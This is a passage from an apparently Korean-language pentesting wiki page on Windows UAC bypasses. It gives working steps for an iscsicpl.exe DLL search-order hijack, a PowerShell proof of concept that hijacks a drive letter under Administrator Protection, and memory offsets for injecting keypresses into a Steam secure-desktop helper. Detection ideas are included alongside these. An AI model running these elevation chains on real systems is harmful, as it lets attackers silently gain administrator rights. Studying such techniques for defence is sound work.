**autoElevated binary**가 실행할 **binary** 또는 **command**의 **이름/경로**를 **registry**에서 **읽으려는지** 확인하는 방법입니다(해당 binary가 **HKCU**에서 이 정보를 찾는다면 더욱 유용합니다).

### `SysWOW64\iscsicpl.exe`와 사용자 `PATH` DLL hijack을 통한 UAC bypass

32비트 `C:\Windows\SysWOW64\iscsicpl.exe`는 **auto-elevated** binary이며, 검색 순서를 이용해 `iscsiexe.dll`을 로드하도록 악용할 수 있습니다. **사용자가 쓸 수 있는** 폴더에 악성 `iscsiexe.dll`을 넣고 현재 사용자의 `PATH`(예: `HKCU\Environment\Path`)를 수정해 해당 폴더를 검색하도록 하면, Windows가 **UAC prompt를 표시하지 않고** 공격자의 DLL을 권한 상승된 `iscsicpl.exe` process에서 로드할 수 있습니다.<sup>[[1]](#references)[[6]](#references)</sup>

실전 참고 사항:
- 현재 사용자가 **Administrators** 그룹에 속해 있지만 UAC로 인해 **Medium Integrity**에서 실행 중일 때 유용합니다.
- 이 bypass에서 관련 있는 것은 **SysWOW64** 복사본입니다. **System32** 복사본은 별개의 binary로 취급하고 동작을 독립적으로 검증하세요.
- 이 primitive는 **auto-elevation**과 **DLL search-order hijacking**의 조합이므로, 다른 UAC bypass에서 사용되는 ProcMon workflow로 누락된 DLL 로드를 검증할 수 있습니다.

최소 흐름:

```cmd
copy iscsiexe.dll %TEMP%\iscsiexe.dll
reg add "HKCU\Environment" /v Path /t REG_SZ /d "%TEMP%" /f
C:\Windows\System32\cmd.exe /c C:\Windows\SysWOW64\iscsicpl.exe
```

탐지 아이디어:
- `reg add` / 레지스트리 쓰기로 `HKCU\Environment\Path`를 수정한 직후 `C:\Windows\SysWOW64\iscsicpl.exe`가 실행되는 경우 경고를 생성합니다.
- `%TEMP%` 또는 `%LOCALAPPDATA%\Microsoft\WindowsApps` 등 **사용자가 제어할 수 있는** 위치에서 `iscsiexe.dll`을 탐색합니다.
- `iscsicpl.exe` 실행과 예상치 못한 자식 프로세스 또는 일반적인 Windows 디렉터리 외부에서 로드된 DLL을 연관 지어 분석합니다.

### 별도로 확인할 만한 최신 연구

2024년 이후 일부 체인은 기존의 `HKCU\Software\Classes` 레지스트리 하이재킹과는 다른 형태입니다. 예를 들어, activation-context cache poisoning은 **드라이브 리매핑**과 **DLL 리디렉션**을 연결해 `ctfmon.exe` 같은 신뢰된 UI / 자동 상승 바이너리와 이후의 `fodhelper.exe` 같은 대상으로 중간 무결성에서 높은 무결성으로 권한을 높일 수 있습니다. 여기에 대규모 PoC를 중복해 싣는 대신, 다음에서 간결한 페이로드 예제를 확인하세요.

{{#ref}}
../windows-local-privilege-escalation/windows-c-payloads.md
{{#endref}}

### Administrator Protection(프리뷰): 로그온 세션별 DOS 디바이스 맵을 통한 드라이브 문자 하이재킹

> [!NOTE]
> 2026년 8월 기준, Microsoft는 여전히 Administrator Protection을 **Insider 프리뷰**로 문서화하고 있습니다. 2025년 10월 롤아웃은 취소되었으며 이후로 연기될 예정입니다. 이 체인을 테스트하기 전에 **Admin Approval Mode with Administrator protection**이 실제로 활성화되어 있고 기기가 재부팅되었는지 확인하세요. 기본 25H2 버전 문자열만으로는 기능이 활성화되었다고 볼 수 없습니다.<sup>[[10]](#references)</sup>

Windows 11 25H2 프리뷰 빌드의 전체 `RAiLaunchAdminProcess` / UIAccess 공격 표면은 전용 페이지를 확인하세요.

{{#ref}}
../windows-local-privilege-escalation/uiaccess-admin-protection-bypass.md
{{#endref}}

Windows 11 25H2의 “Administrator Protection”은 세션별 `\Sessions\0\DosDevices/<LUID>` 맵을 사용하는 shadow-admin 토큰을 사용합니다. 이 디렉터리는 `SeGetTokenDeviceMap`이 처음 `\??`를 확인할 때 지연 생성됩니다. 공격자가 shadow-admin 토큰을 **SecurityIdentification** 수준으로만 가장하면, 디렉터리는 공격자를 **소유자**로 하여 생성됩니다(`CREATOR OWNER` 상속). 따라서 드라이브 문자 링크가 `\GLOBAL??`보다 우선 적용됩니다.<sup>[[7]](#references)</sup>

**단계:**

1. 권한이 낮은 세션에서 `RAiProcessRunOnce`를 호출해 프롬프트 없이 shadow-admin `runonce.exe`를 실행합니다.
2. 해당 프로세스의 기본 토큰을 **identification** 토큰으로 복제하고, 공격자가 소유하는 `\Sessions\0\DosDevices/<LUID>`가 생성되도록 `\??`를 여는 동안 해당 토큰을 가장합니다.
3. 해당 위치에 공격자가 제어하는 저장소를 가리키는 `C:` 심볼릭 링크를 생성합니다. 이후 해당 세션의 파일 시스템 접근은 `C:`를 공격자 경로로 해석하므로 프롬프트 없이 DLL/파일 하이재킹이 가능합니다.

**PowerShell PoC(NtObjectManager):**
```powershell
$pid = Invoke-RAiProcessRunOnce
$p = Get-Process -Id $pid
$t = Get-NtToken -Process $p
$id = New-NtTokenDuplicate -Token $t -ImpersonationLevel Identification
Invoke-NtToken $id -ImpersonationLevel Identification { Get-NtDirectory "\??" | Out-Null }
$auth = Get-NtTokenId -Authentication -Token $id
New-NtSymbolicLink "\Sessions\0\DosDevices/$auth/C:" "\??\\C:\\Users\\attacker\\loot"
```

프리뷰 호스트에서 Administrator Protection은 `Microsoft-Windows-LUA` provider 아래 ETW 이벤트 **15031** 및 **15032**로 승인과 실패를 기록합니다. 이벤트에는 요청자의 SID, 애플리케이션 경로, 결과, 관리되는 관리자 계정, 인증 방식이 포함되므로, 반복적인 exploit 시도나 UI 조작 실패가 텔레메트리에 남지 않는 것은 아닙니다.<sup>[[10]](#references)</sup>

```cmd
logman start AdminProtectionTrace -p {93c05d69-51a3-485e-877f-1806a8731346} -ets
rem reproduce the elevation attempt
logman stop AdminProtectionTrace -ets
```



### 쓰기 가능한 공유 메모리 링을 통해 전달되는 보안 데스크톱 입력

중간 무결성 사용자가 입력 IPC에 쓸 수 있다면 보안 데스크톱 도우미가 UAC 프롬프트를 무력화할 수 있습니다. 보고된 Steam 설계에서 `IClientSecureDesktop::BStartStreaming`은 SYSTEM으로 `winsta0\winlogon`에서 `secure_desktop_capture.exe`를 시작합니다. 이 프로세스는 사용자에게 `GENERIC_ALL` 액세스 권한이 부여된 `Global\SecureDesktopInput_mem-IPCWrapper`를 노출합니다. 도우미는 링 항목을 읽고 보안 데스크톱에서 `SendInput`을 호출합니다. 이는 UIAccess를 사용하거나 `PromptOnSecureDesktop`을 변경하는 것과 다릅니다. 입력은 이미 해당 데스크톱에서 실행 중인 프로세스가 전달합니다. 클라이언트가 이 핸들러에 도달하는 방식은 [서비스 IPC 부트스트랩](../windows-local-privilege-escalation/abusing-auto-updaters-and-ipc.md#shared-memory-bootstrap-into-privileged-service-ipc)을 참조하세요. <sup>[[15]](#references)[[16]](#references)</sup>

링에는 173바이트 슬롯 128개가 있습니다. 쓰기 및 읽기 카운터는 `0x414`와 `0x418`에 있으며, 슬롯 `N`은 `0x41c + 173*N`에 있습니다. 슬롯의 첫 번째 바이트를 `0`으로 설정해 평문임을 표시하고, 바로 뒤에 40바이트 Windows `INPUT`을 복사한 다음 쓰기 카운터를 증가시키세요. 동의 프롬프트를 보는 중간 무결성 관리자라면 상승을 요청하는 실행 파일을 시작한 뒤 키보드의 `Y` 키 누름 및 뗌 입력으로 UAC의 긍정 버튼을 활성화할 수 있습니다. 하지만 일반 사용자 자격 증명 프롬프트에는 응답할 수 없습니다. **동의 단계는 여전히 중요합니다**. 도우미는 사용자가 현재 90일 인증 기간에 해당하는 `InputEnabled` 프롬프트를 승인한 뒤에만 입력을 전달합니다. 매핑을 읽고 쓸 수 있다는 사실만으로 프롬프트에 입력이 전달된다고 단정할 수는 없습니다. 통제된 테스트 전후의 읽기 카운터를 비교하세요. <sup>[[15]](#references)[[16]](#references)</sup>

## References

- [1] [LOLBAS: Iscsicpl.exe](https://lolbas-project.github.io/lolbas/Binaries/Iscsicpl/)
- [2] [Microsoft Docs – 사용자 계정 컨트롤 작동 방식](https://learn.microsoft.com/windows/security/identity-protection/user-account-control/how-user-account-control-works)
- [3] [UACME – UAC 우회 기법 모음](https://github.com/hfiref0x/UACME)
- [4] [WinPwnage – UAC 우회 호환성 스캐너 및 실행 도구](https://github.com/rootm0s/WinPwnage)
- [5] [Checkpoint Research – KONNI, AI를 활용해 PowerShell 백도어 생성](https://research.checkpoint.com/2026/konni-targets-developers-with-ai-malware/)
- [6] [Check Point Research – Operation TrueChaos: 동남아시아 정부 기관을 겨냥한 제로데이 악용](https://research.checkpoint.com/2026/operation-truechaos-0-day-exploitation-against-southeast-asian-government-targets/)
- [7] [Project Zero – Windows Administrator Protection 우회](https://projectzero.google/2026/26/windows-administrator-protection.html)
- [8] [Sigma / Detection.FYI – SilentCleanup 작업을 이용한 UAC 우회](https://detection.fyi/sigmahq/sigma/windows/registry/registry_set/registry_set_bypass_uac_using_silentcleanup_task/)
- [9] [R41N3RZUF477 – UnifiedConsent, TabTip 및 Narrator의 항상 알림 우회](https://github.com/hfiref0x/UACME/issues/173)
- [10] [Microsoft Learn – 관리자 보호](https://learn.microsoft.com/en-us/windows/security/application-security/application-control/administrator-protection/)
- [11] [Google Project Zero – .NET에서 로컬 Windows RPC 서버 호출하기](https://projectzero.google/2019/12/calling-local-windows-rpc-servers-from.html)
- [12] [Kaspersky Securelist – HoneyMyte, 서명된 Windows 커널 루트킷으로 CoolClient 강화](https://securelist.com/honeymyte-coolclient-driver-rootkit/121028)
- [13] [Group-IB – KGB RAT: 감시, 탈취, 위협을 위해 제작된 완전 은닉형 Windows 트로이 목마](https://www.group-ib.com/blog/kgb-rat-windows-fud-trojan/)
- [14] [LOLBAS – ComputerDefaults.exe](https://lolbas-project.github.io/lolbas/Binaries/ComputerDefaults/)
- [15] [Atredis – 밸브 돌리기](https://atredis.com/blog/2026/10/28/turning-the-valve)
- [16] [Atredis – 밸브 돌리기 PoC](https://github.com/atredispartners/proof-of-concept/tree/main/turning-the-valve/code)
